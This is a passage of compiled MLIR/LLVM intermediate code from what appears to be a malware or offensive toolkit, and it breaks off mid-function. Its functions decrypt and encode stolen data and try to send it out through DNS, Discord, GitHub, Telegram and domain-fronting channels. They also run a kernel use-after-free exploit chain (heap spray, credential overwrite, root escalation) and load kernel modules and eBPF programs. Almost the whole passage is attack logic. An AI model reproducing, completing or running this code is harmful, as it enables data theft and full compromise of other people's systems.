  ^bb10:  // 2 preds: ^bb8, ^bb9
    %108 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<5 x i8>
    %109 = llvm.call @fs_list_files(%108, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %109, %26 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %110 = llvm.load %26 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %111 = llvm.call @strlen(%110) : (!llvm.ptr) -> i64
    %112 = llvm.sext %2 : i32 to i64
    %113 = llvm.icmp "sgt" %111, %112 : i64
    llvm.cond_br %113, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %114 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %115 = llvm.load %26 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %116 = llvm.call @jocky_str_concat(%114, %115) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %116, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %117 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %118 = llvm.load %26 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %119 = llvm.call @strlen(%118) : (!llvm.ptr) -> i64
    %120 = llvm.call @string(%119) : (i64) -> !llvm.ptr
    %121 = llvm.call @jocky_str_concat(%117, %120) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %122 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %123 = llvm.call @jocky_str_concat(%121, %122) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%123) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    %124 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<22 x i8>
    %125 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %126 = llvm.call @strlen(%125) : (!llvm.ptr) -> i64
    %127 = llvm.call @string(%126) : (i64) -> !llvm.ptr
    %128 = llvm.call @jocky_str_concat(%124, %127) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %129 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<22 x i8>
    %130 = llvm.call @jocky_str_concat(%128, %129) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%130) : (!llvm.ptr) -> ()
    %131 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%131) : (!llvm.ptr) -> ()
    %132 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %133 = llvm.call @strlen(%132) : (!llvm.ptr) -> i64
    %134 = llvm.sext %2 : i32 to i64
    %135 = llvm.icmp "sgt" %133, %134 : i64
    llvm.return %135 : i1
  }
  llvm.func @phase_encrypt_data() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.41" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %4 = llvm.mlir.constant(66 : i32) : i32
    %5 = llvm.mlir.addressof @".str.42" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.43" : !llvm.ptr
    %7 = llvm.mlir.constant(6 : i32) : i32
    %8 = llvm.mlir.addressof @".str.44" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.45" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.46" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.15" : !llvm.ptr
    %12 = llvm.mlir.constant(true) : i1
    %13 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %14 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %17 = llvm.call @strlen(%16) : (!llvm.ptr) -> i64
    %18 = llvm.sext %2 : i32 to i64
    %19 = llvm.icmp "sgt" %17, %18 : i64
    llvm.cond_br %19, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %20 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %21 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %22 = llvm.call @strlen(%21) : (!llvm.ptr) -> i64
    %23 = llvm.trunc %22 : i64 to i32
    %24 = llvm.trunc %4 : i32 to i8
    llvm.call @jocky_decrypt_xor(%20, %23, %24, %0) : (!llvm.ptr, i32, i8, i32) -> ()
    %25 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %27 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %28 = llvm.call @strlen(%27) : (!llvm.ptr) -> i64
    %29 = llvm.trunc %28 : i64 to i32
    %30 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @jocky_decrypt_rc4(%26, %29, %30, %7) : (!llvm.ptr, i32, !llvm.ptr, i32) -> ()
    %31 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %33 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %34 = llvm.call @strlen(%33) : (!llvm.ptr) -> i64
    %35 = llvm.trunc %34 : i64 to i32
    %36 = llvm.call @jocky_compress_data(%32, %35) : (!llvm.ptr, i32) -> !llvm.ptr
    llvm.store %36, %13 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %37 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    llvm.call @println(%37) : (!llvm.ptr) -> ()
    %38 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %39 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %40 = llvm.call @strlen(%39) : (!llvm.ptr) -> i64
    %41 = llvm.trunc %40 : i64 to i32
    %42 = llvm.call @jocky_data_base64_encode(%38, %41) : (!llvm.ptr, i32) -> !llvm.ptr
    llvm.store %42, %14 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %43 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    %44 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %45 = llvm.call @strlen(%44) : (!llvm.ptr) -> i64
    %46 = llvm.call @string(%45) : (i64) -> !llvm.ptr
    %47 = llvm.call @jocky_str_concat(%43, %46) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %48 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %49 = llvm.call @jocky_str_concat(%47, %48) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %50 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%50) : (!llvm.ptr) -> ()
    llvm.return %12 : i1
  }
  llvm.func @phase_exfiltrate() -> i1 {
    %0 = llvm.mlir.addressof @".str.47" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.49" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.50" : !llvm.ptr
    %5 = llvm.mlir.constant(4096 : i32) : i32
    %6 = llvm.mlir.addressof @".str.51" : !llvm.ptr
    %7 = llvm.mlir.constant(256 : i32) : i32
    %8 = llvm.mlir.addressof @".str.52" : !llvm.ptr
    %9 = llvm.mlir.constant(2000 : i32) : i32
    %10 = llvm.mlir.addressof @".str.53" : !llvm.ptr
    %11 = llvm.mlir.constant(1024 : i32) : i32
    %12 = llvm.mlir.addressof @".str.54" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.55" : !llvm.ptr
    %14 = llvm.mlir.constant(512 : i32) : i32
    %15 = llvm.mlir.addressof @".str.56" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.57" : !llvm.ptr
    %17 = llvm.mlir.constant(true) : i1
    %18 = llvm.mlir.addressof @".str.48" : !llvm.ptr
    %19 = llvm.mlir.constant(false) : i1
    %20 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<39 x i8>
    llvm.call @println(%20) : (!llvm.ptr) -> ()
    %21 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %22 = llvm.call @strlen(%21) : (!llvm.ptr) -> i64
    %23 = llvm.sext %1 : i32 to i64
    %24 = llvm.icmp "eq" %22, %23 : i64
    llvm.cond_br %24, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %25 = llvm.getelementptr %18[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    llvm.return %19 : i1
  ^bb2:  // pred: ^bb0
    %26 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %27 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %28 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %29 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<5 x i8>
    %30 = llvm.call @jocky_exfil_front(%26, %27, %28, %29, %5) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %30, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %31 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %32 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %33 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %34 = llvm.call @jocky_exfil_dns(%32, %33, %7) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %34, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %35 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%35) : (!llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %36 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %37 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %38 = llvm.call @jocky_exfil_discord(%36, %37, %9) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %38, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %39 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%39) : (!llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    %40 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %41 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %42 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %43 = llvm.call @jocky_exfil_github(%40, %41, %42, %11) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %43, ^bb9, ^bb10
  ^bb9:  // pred: ^bb8
    %44 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<39 x i8>
    llvm.call @println(%44) : (!llvm.ptr) -> ()
    llvm.br ^bb10
  ^bb10:  // 2 preds: ^bb8, ^bb9
    %45 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %46 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %47 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %48 = llvm.call @jocky_exfil_telegram(%45, %46, %47, %14) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %48, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %49 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    %50 = llvm.getelementptr %16[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%50) : (!llvm.ptr) -> ()
    %51 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%51) : (!llvm.ptr) -> ()
    llvm.return %17 : i1
  }
  llvm.func @phase_kernel_exploit() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.58" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.59" : !llvm.ptr
    %4 = llvm.mlir.constant(1024 : i32) : i32
    %5 = llvm.mlir.addressof @".str.60" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.61" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.62" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.63" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.64" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.65" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.67" : !llvm.ptr
    %12 = llvm.mlir.addressof @LKM_PATHS : !llvm.ptr
    %13 = llvm.mlir.constant(0 : i64) : i64
    %14 = llvm.mlir.constant(3 : i64) : i64
    %15 = llvm.mlir.addressof @".str.73" : !llvm.ptr
    %16 = llvm.mlir.addressof @EBPF_PROGRAMS : !llvm.ptr
    %17 = llvm.mlir.constant(4 : i64) : i64
    %18 = llvm.mlir.addressof @".str.78" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %20 = llvm.mlir.constant(false) : i1
    %21 = llvm.mlir.addressof @".str.74" : !llvm.ptr
    %22 = llvm.mlir.constant(256 : i32) : i32
    %23 = llvm.mlir.addressof @".str.75" : !llvm.ptr
    %24 = llvm.mlir.addressof @".str.76" : !llvm.ptr
    %25 = llvm.mlir.addressof @".str.77" : !llvm.ptr
    %26 = llvm.mlir.constant(1 : i64) : i64
    %27 = llvm.mlir.addressof @".str.68" : !llvm.ptr
    %28 = llvm.mlir.addressof @".str.69" : !llvm.ptr
    %29 = llvm.mlir.addressof @".str.70" : !llvm.ptr
    %30 = llvm.mlir.constant(true) : i1
    %31 = llvm.mlir.addressof @kernel_access : !llvm.ptr
    %32 = llvm.mlir.addressof @".str.71" : !llvm.ptr
    %33 = llvm.mlir.zero : !llvm.ptr
    %34 = llvm.mlir.addressof @".str.72" : !llvm.ptr
    %35 = llvm.mlir.addressof @".str.66" : !llvm.ptr
    %36 = llvm.mlir.addressof @root_achieved : !llvm.ptr
    %37 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %38 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %39 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %40 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<49 x i8>
    llvm.call @println(%40) : (!llvm.ptr) -> ()
    %41 = llvm.call @jocky_fence2pwn_detect_kfence() : () -> i32
    %42 = llvm.icmp "sgt" %41, %2 : i32
    llvm.cond_br %42, ^bb1, ^bb16
  ^bb1:  // pred: ^bb0
    %43 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    llvm.call @println(%43) : (!llvm.ptr) -> ()
    %44 = llvm.sext %4 : i32 to i64
    %45 = llvm.call @jocky_alloc(%44) : (i64) -> !llvm.ptr
    llvm.store %45, %37 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %46 = llvm.load %37 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %47 = llvm.call @jocky_fence2pwn_get_pool_info(%46) : (!llvm.ptr) -> i32
    %48 = llvm.icmp "sgt" %47, %2 : i32
    llvm.cond_br %48, ^bb2, ^bb3
  ^bb2:  // pred: ^bb1
    %49 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb1, ^bb2
    %50 = llvm.call @jocky_fence2pwn_spray() : () -> i1
    llvm.cond_br %50, ^bb4, ^bb5
  ^bb4:  // pred: ^bb3
    %51 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%51) : (!llvm.ptr) -> ()
    llvm.br ^bb5
  ^bb5:  // 2 preds: ^bb3, ^bb4
    %52 = llvm.call @jocky_fence2pwn_trigger() : () -> i1
    llvm.cond_br %52, ^bb6, ^bb7
  ^bb6:  // pred: ^bb5
    %53 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%53) : (!llvm.ptr) -> ()
    llvm.br ^bb7
  ^bb7:  // 2 preds: ^bb5, ^bb6
    %54 = llvm.call @jocky_fence2pwn_verify_spray() : () -> i1
    llvm.cond_br %54, ^bb8, ^bb9
  ^bb8:  // pred: ^bb7
    %55 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<34 x i8>
    llvm.call @println(%55) : (!llvm.ptr) -> ()
    llvm.br ^bb9
  ^bb9:  // 2 preds: ^bb7, ^bb8
    %56 = llvm.load %37 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %57 = llvm.call @jocky_fence2pwn_exploit_uaf(%2, %0, %56) : (i32, i32, !llvm.ptr) -> i32
    %58 = llvm.icmp "sgt" %57, %2 : i32
    llvm.cond_br %58, ^bb10, ^bb15
  ^bb10:  // pred: ^bb9
    %59 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%59) : (!llvm.ptr) -> ()
    %60 = llvm.call @jocky_fence2pwn_manipulate_creds(%2, %2) : (i32, i32) -> i32
    %61 = llvm.icmp "sgt" %60, %2 : i32
    llvm.cond_br %61, ^bb11, ^bb14
  ^bb11:  // pred: ^bb10
    %62 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%62) : (!llvm.ptr) -> ()
    %63 = llvm.call @jocky_fence2pwn_elevate_to_root() : () -> i32
    %64 = llvm.icmp "sgt" %63, %2 : i32
    llvm.cond_br %64, ^bb12, ^bb13
  ^bb12:  // pred: ^bb11
    %65 = llvm.getelementptr %35[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%65) : (!llvm.ptr) -> ()
    llvm.store %30, %36 {alignment = 1 : i64} : i1, !llvm.ptr
    llvm.store %30, %31 {alignment = 1 : i64} : i1, !llvm.ptr
    %66 = llvm.load %37 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @jocky_free(%66) : (!llvm.ptr) -> ()
    llvm.return %30 : i1
  ^bb13:  // pred: ^bb11
    llvm.br ^bb14
  ^bb14:  // 2 preds: ^bb10, ^bb13
    llvm.br ^bb15
  ^bb15:  // 2 preds: ^bb9, ^bb14
    %67 = llvm.load %37 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @jocky_free(%67) : (!llvm.ptr) -> ()
    llvm.br ^bb16
  ^bb16:  // 2 preds: ^bb0, ^bb15
    %68 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%68) : (!llvm.ptr) -> ()
    %69 = llvm.load %12 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %70 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %13, %70 {alignment = 8 : i64} : i64, !llvm.ptr
    %71 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb17
  ^bb17:  // 2 preds: ^bb16, ^bb25
    %72 = llvm.load %70 {alignment = 8 : i64} : !llvm.ptr -> i64
    %73 = llvm.icmp "slt" %72, %14 : i64
    llvm.cond_br %73, ^bb18, ^bb26
  ^bb18:  // pred: ^bb17
    %74 = llvm.bitcast %69 : !llvm.ptr to !llvm.ptr
    %75 = llvm.getelementptr %74[%72] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %76 = llvm.load %75 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %76, %71 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %77 = llvm.load %71 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %78 = llvm.call @fs_exists(%77) : (!llvm.ptr) -> i1
    llvm.cond_br %78, ^bb19, ^bb24
  ^bb19:  // pred: ^bb18
    %79 = llvm.getelementptr %27[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    %80 = llvm.load %71 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %81 = llvm.call @jocky_str_concat(%79, %80) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%81) : (!llvm.ptr) -> ()
    %82 = llvm.load %71 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %83 = llvm.getelementptr %28[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %84 = llvm.call @jocky_lkm_load(%82, %83) : (!llvm.ptr, !llvm.ptr) -> i32
    %85 = llvm.icmp "sgt" %84, %2 : i32
    llvm.cond_br %85, ^bb20, ^bb23
  ^bb20:  // pred: ^bb19
    %86 = llvm.getelementptr %29[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<42 x i8>
    llvm.call @println(%86) : (!llvm.ptr) -> ()
    llvm.store %30, %31 {alignment = 1 : i64} : i1, !llvm.ptr
    %87 = llvm.getelementptr %28[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %88 = llvm.getelementptr %32[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %89 = llvm.call @jocky_lkm_get_symbol(%87, %88) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %89, %38 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %90 = llvm.load %38 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %91 = llvm.icmp "ne" %90, %33 : !llvm.ptr
    llvm.cond_br %91, ^bb21, ^bb22
  ^bb21:  // pred: ^bb20
    %92 = llvm.getelementptr %34[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%92) : (!llvm.ptr) -> ()
    llvm.br ^bb22
  ^bb22:  // 2 preds: ^bb20, ^bb21
    %93 = llvm.getelementptr %28[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %94 = llvm.call @jocky_lkm_unload(%93) : (!llvm.ptr) -> i32
    llvm.return %30 : i1
  ^bb23:  // pred: ^bb19
    llvm.br ^bb24
  ^bb24:  // 2 preds: ^bb18, ^bb23
    llvm.br ^bb25
  ^bb25:  // pred: ^bb24
    %95 = llvm.add %72, %26 : i64
    llvm.store %95, %70 {alignment = 8 : i64} : i64, !llvm.ptr
    llvm.br ^bb17
  ^bb26:  // pred: ^bb17
    %96 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%96) : (!llvm.ptr) -> ()
    %97 = llvm.load %16 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %98 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %13, %98 {alignment = 8 : i64} : i64, !llvm.ptr
    %99 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb27
  ^bb27:  // 2 preds: ^bb26, ^bb33
    %100 = llvm.load %98 {alignment = 8 : i64} : !llvm.ptr -> i64
    %101 = llvm.icmp "slt" %100, %17 : i64
    llvm.cond_br %101, ^bb28, ^bb34
  ^bb28:  // pred: ^bb27
    %102 = llvm.bitcast %97 : !llvm.ptr to !llvm.ptr
    %103 = llvm.getelementptr %102[%100] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %104 = llvm.load %103 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %104, %99 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %105 = llvm.getelementptr %21[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    %106 = llvm.load %99 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %107 = llvm.call @jocky_str_concat(%105, %106) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%107) : (!llvm.ptr) -> ()
    %108 = llvm.load %99 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %109 = llvm.call @jocky_ebpf_load(%108, %22, %2) : (!llvm.ptr, i32, i32) -> i32
    llvm.store %109, %39 {alignment = 4 : i64} : i32, !llvm.ptr
    %110 = llvm.load %39 {alignment = 4 : i64} : !llvm.ptr -> i32
    %111 = llvm.icmp "sgt" %110, %2 : i32
    llvm.cond_br %111, ^bb29, ^bb32
  ^bb29:  // pred: ^bb28
    %112 = llvm.getelementptr %23[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<34 x i8>
    %113 = llvm.load %39 {alignment = 4 : i64} : !llvm.ptr -> i32
    %114 = llvm.sext %113 : i32 to i64
    %115 = llvm.call @string(%114) : (i64) -> !llvm.ptr
    %116 = llvm.call @jocky_str_concat(%112, %115) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %117 = llvm.getelementptr %24[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x i8>
    %118 = llvm.call @jocky_str_concat(%116, %117) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%118) : (!llvm.ptr) -> ()
    %119 = llvm.load %39 {alignment = 4 : i64} : !llvm.ptr -> i32
    %120 = llvm.call @jocky_ebpf_attach(%119, %2, %2) : (i32, i32, i32) -> i32
    %121 = llvm.icmp "sgt" %120, %2 : i32
    llvm.cond_br %121, ^bb30, ^bb31
  ^bb30:  // pred: ^bb29
